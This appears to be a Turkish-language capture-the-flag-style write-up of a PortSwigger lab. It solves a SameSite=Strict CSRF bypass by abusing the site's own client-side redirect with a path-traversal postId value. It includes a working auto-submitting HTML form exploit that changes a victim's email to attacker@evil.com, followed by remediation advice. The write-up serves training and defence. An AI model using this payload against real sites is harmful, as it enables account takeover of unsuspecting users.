# SameSite Strict Bypass via Client-Side Redirect — Writeup

**Platform:** PortSwigger Web Security Academy
**Tarih:** 2026-11-13

---

## Executive Summary

- **Hedef:** `https://<lab-id>.web-security-academy.net/` (PortSwigger lab)
- **Zorluk:** Zor (Expert)
- **Tespit Edilen Zafiyet:** CSRF — SameSite=Strict savunması, hedefin kendi client-side redirect gadget'ı (path traversal ile) kötüye kullanılarak atlatılıyor
- **Genel Etki:** Saldırgan, hedefin yorum onay sayfasındaki redirect'i yeniden yönlendirip e-posta değiştirme CSRF'i gerçekleştirebilir
- **Durum:** Tamamlandı — gadget'a yönlendiren GET form exploit'i teslim edildi, lab çözüldü

---

## Reconnaissance & Enumeration

- Session cookie: SameSite=Strict (ya da Strict davranışı). Cross-site istekte cookie gitmez → klasik CSRF başarısız.
- change-email: GET kabul ediyor (`?email=...&submit=...`), token yok.
- **Gadget keşfi:** Yorum gönderimi (`POST /post/comment`) → 302 → `/post/comment/confirmation?postId=<n>`. Bu confirmation sayfası harici bir JS yüklüyor ve çağırıyor:
  ```html
  <script src='/resources/js/commentConfirmationRedirect.js'></script>
  <script>redirectOnConfirmation('/post');</script>
  ```
- Gadget fonksiyonu (`commentConfirmationRedirect.js`):
  ```javascript
  redirectOnConfirmation = (blogPath) => {
      setTimeout(() => {
          const url = new URL(window.location);
          const postId = url.searchParams.get("postId");
          window.location = blogPath + '/' + postId;   // = /post/<postId>
      }, 3000);
  }
  ```

---

## Vulnerability Analysis

- **Gadget:** Confirmation sayfası, URL'den `postId`'yi okuyup `window.location = '/post/' + postId` ile **client-side redirect** yapıyor. `postId` saldırgan kontrolünde.
- **Neden client-side redirect kritik:** Bu redirect, hedefin **kendi yüklenmiş sayfasından** (confirmation) tetikleniyor → **same-site** navigasyon → SameSite=Strict cookie **gönderilir.** (Server-side 302 olsaydı cross-site zincirin parçası kalır, cookie gitmezdi.)
- **Path traversal ile hedefleme:** `/post/` + postId bir path üretiyor. `postId = ../my-account/change-email?...` → `/post/../my-account/change-email?...` → tarayıcı normalize eder → `/my-account/change-email?...` Bu, tarayıcının **standart URL normalizasyonu** (RFC 3986), site zafiyeti değil — her tarayıcıda güvenilir.

---

## Exploitation

### 1. Payload (postId)
change-email hem `email` hem `submit` parametresi istiyor ("Missing parameter: 'submit'" hatasından anlaşıldı):
```
postId = ../my-account/change-email?email=attacker@evil.com&submit=1
```
Birleşim: `/post/` + bu = `/post/../my-account/change-email?email=...&submit=1` → normalize → `/my-account/change-email?email=...&submit=1`

### 2. Encoding
Gadget URL'inde postId değerindeki `?` ve `&`, searchParams tarafından delimiter sanılmasın diye encode edilir (`%3F`, `%26`). **GET form kullanılırsa tarayıcı bu encoding'i otomatik yapar** — input value'ya ham `?&` yazılır.

### 3. Exploit (GET form → gadget)
```html
<form action="https://<lab-id>.web-security-academy.net/post/comment/confirmation" method="GET">
  <input type="hidden" name="postId" value="../my-account/change-email?email=attacker@evil.com&submit=1">
</form>
<script>document.forms[0].submit();</script>
```

Akış:
1. Kurban exploit sayfasını açar → form auto-submit → **top-level GET navigation** → confirmation sayfası yüklenir (tarayıcı postId değerini otomatik encode eder)
2. Confirmation sayfasının JS'i (gadget) çalışır: 3 sn sonra `/post/` + postId'ye redirect
3. Bu **client-side redirect**, confirmation sayfasından (same-site) tetiklenir → Strict cookie gider
4. `../` normalize → change-email'e gidilir → kurbanın e-postası değişir

### 4. Teslimat
Exploit server → Store → View exploit (test) → Deliver to victim → lab çözüldü.

---

## Remediation

- **Client-side redirect'lerde kullanıcı girdisi ile navigasyon yapma:** `window.location`'a URL parametresinden gelen değer yazılmamalı; en azından allowlist/doğrulama olmalı.
- **Açık redirect/path manipülasyonunu engelle:** `postId` sayısal olmalı, `../` içeren değerler reddedilmeli.
- **CSRF token** (defense in depth): SameSite atlatılsa bile token'a takılır.
- **SameSite=Strict tek savunma olmamalı** — gadget/subdomain bypass'ları var.

---

## Gotchas (Dikkat Edilecekler)

- **Gadget = hedefin KENDİ JS'i.** Biz kod enjekte etmiyoruz; hedefin mevcut redirect'ini parametre ile kötüye kullanıyoruz. Çalışan JS hedefin, biz sadece nereye gideceğini (`postId`) belirliyoruz.
- **Client-side redirect ≠ sunucusuz.** İstek gider; fark, yönlendirme kararını tarayıcının (JS) vermesi. Son navigasyon yüklenmiş same-site sayfadan çıkar → Strict cookie gider. Server-side 302 bunu yapamaz.
- **`../` bir site zafiyeti değil, tarayıcı URL normalizasyonu** (RFC 3986). Evrensel, güvenilir.
- **`../` same-site'a alternatif değil** — redirect'i (zaten same-site olan) hedefe nişan alma aracı. Same-site'ı gadget sağlıyor, `../` hedefi değiştiriyor.
- **İki lab'ı karıştırma:** SameSite Lax (method override: GET+`_method=POST`, doğrudan change-email) ≠ SameSite Strict (gadget üzerinden, method override YOK — change-email zaten GET kabul ediyor). Bu lab'da `_method` yoktu, action da change-email değil **confirmation** idi.
- **Path doğru olmalı:** `/post/comment/confirmation` (tam) — `/post/comment` (confirmation eksik) ya da `/post/confirmation` (comment eksik) → Not Found. Burp "Copy URL" ile tam path al, elle yazma.
- **GET form encoding'i otomatik yapar** → input value'ya **ham** `?&` yaz, encode'lu (`%3F`) yazma (çift encode olur).
- **`submit` parametresi gerekli** — change-email "Missing parameter: 'submit'" veriyorsa, `email` yanında `submit=1` de lazım (formun submit butonu).
- **Gadget harici .js'de:** inline script `redirectOnConfirmation` fonksiyonunu ÇAĞIRIYOR, tanımı harici dosyada. Fonksiyon çağrısı görünce tanımı harici .js'de ara.

---

## Zincir Özeti

```
exploit (GET form) 
  → confirmation sayfası yüklenir (top-level nav)
  → gadget JS: window.location = '/post/' + postId
  → postId = ../my-account/change-email?email=...&submit=1
  → /post/../my-account/change-email?... → normalize → /my-account/change-email?...
  → client-side redirect same-site → Strict cookie gider
  → e-posta değişir
```
